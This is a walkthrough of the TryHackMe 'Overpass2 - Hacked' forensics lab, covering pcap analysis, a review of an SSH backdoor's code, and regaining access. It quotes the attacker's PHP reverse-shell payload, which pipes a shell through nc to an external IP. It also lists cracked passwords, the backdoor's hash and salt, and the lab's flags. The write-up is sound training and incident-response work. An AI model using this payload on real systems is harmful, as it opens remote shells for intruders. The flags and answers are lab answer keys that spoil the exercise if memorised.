# Overpass2- Hacked Challenge Report
## Introduction
This challenge involves network traffic dump captured from a compromised network.
The goal is to analyse the pcap file to identify how the attacker got into the network
and check for persistence. After that we hack our way back into the machine to get
the flags. The challenge also involves password cracking and source code analysis for
malware analysis.

Let’s get going...

## Walkthrough
## Task 1: Forensics- Analyse the PCAP
Question: What was the URL of the page they used to upload a reverse shell? <br>
Answer: **/development/** <br>

To view uploaded data we use thefollowing filter in wireshark **http.request.method=POST** <br>
<img width="953" height="354" alt="task 1 1" src="https://github.com/user-attachments/assets/45184ebb-c109-4842-8c23-8c8ad532ed17" /> <br>
_URL used to upload the reverse the shell_

Question: What payload did the attacker use to gain access? <br>
Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>** <br>

<img width="709" height="177" alt="task 1 2" src="https://github.com/user-attachments/assets/f30ba1dd-6a7c-478c-8c1d-37bf8a35a7d1" /> <br>
_Reverse shell payload used by attacker_

Question: What password did the attacker use to privesc? <br>
Answer: **whenevernoteartinstant**

To get the answer, we filter for http traffic using the filter http and analyze the filtered results. <br>
<img width="1152" height="253" alt="task 1 3" src="https://github.com/user-attachments/assets/d3fd3520-ca2e-4d8a-b202-77b0d6a08ae8" /> <br>
_Password used by attacker for privilege escalation_

Question: How did the attacker establish persistence? <br>
Answer: **https://github.com/NinjaJc01/ssh-backdoor** <br>
<img width="1171" height="87" alt="task 1 4" src="https://github.com/user-attachments/assets/02b6fa5b-684f-491b-a90a-01cf92daf599" /> <br>
_Backdoor used by attacker for persistence_

Question: Using the fasttrack wordlist, how many of the system passwords were crackable? <br>
Answer: **4**

## Task 2: Research- Analyse the code
To analyze the source code, we visit the backdoor payload github page that we discovered in the pcap file, https://github.com/NinjaJc01/ssh-backdoor. <br>
Question: What's the default hash for the backdoor? <br>
Answer: **bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3** <br>
<img width="1881" height="897" alt="task 2 1" src="https://github.com/user-attachments/assets/bbb89866-e9b5-4044-bace-900d37e02e73" />
_Default hash for the backdoor_

Question: What's the hardcoded salt for the backdoor?
Answer: **1c362db832f3f864c8c2fe05f2002a05**

<img width="1589" height="945" alt="task 2 2" src="https://github.com/user-attachments/assets/35ecdc48-711a-4f1a-a166-41d5b920b447" />
_Hard coded salt for the backdoor_

Question: What was the hash that the attacker used?- go back to the
PCAP for this!
Answer: **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**
<img width="1344" height="724" alt="task 2 3" src="https://github.com/user-attachments/assets/b5d5b3e4-cb9e-4252-a167-3e8980e0f0bf" />
_Hash used by the attacker_

Question: Crack the hash using rockyou and a cracking tool of your choice. What's the password? <br>
Answer: **november16**

## Task 3: Attack- Get back in
Question: The attacker defaced the website. What message did they leave as a heading? <br>
Answer: **H4ck3d by CooctusClan** <br>
<img width="1462" height="276" alt="task 3 1" src="https://github.com/user-attachments/assets/4481abd8-41cc-4e21-84c3-7290883a6dbb" /> <br>
_Defaced website_

Question: Using the information you've found previously, hack your way back in! <br>
Answer: **No answer needed.**

Question: What's the user flag? <br>
Answer: **thm{d119b4fa8c497ddb0525f7ad200e6567}** <br>
<img width="800" height="77" alt="task 3 3" src="https://github.com/user-attachments/assets/f23ae5c8-55d7-4ff2-bf6c-f652e72bc96f" /> <br>
_User flag_

Question: What's the root flag? <br>
Answer: **thm{d53b2684f169360bb9606c333873144d}** <br>
<img width="451" height="74" alt="task 3 4 " src="https://github.com/user-attachments/assets/8a419f40-d3aa-4073-a769-3c8d83f13316" /> <br>
_Root flag_

## Module completion
TryHackMe Profile Link: https://tryhackme.com/p/kl45h
_Did this module and completed a while ago_

## Conclusion
Learned a couple of new things. One, analyzing malware and network for IOCs collection which can be used for defense in IDS/IPS systems. Two cracking password hashes with JohnTheRipper and hashcat.

This was a good learning experience as this knowledge can be used during Digital Forensics and Incident Response.
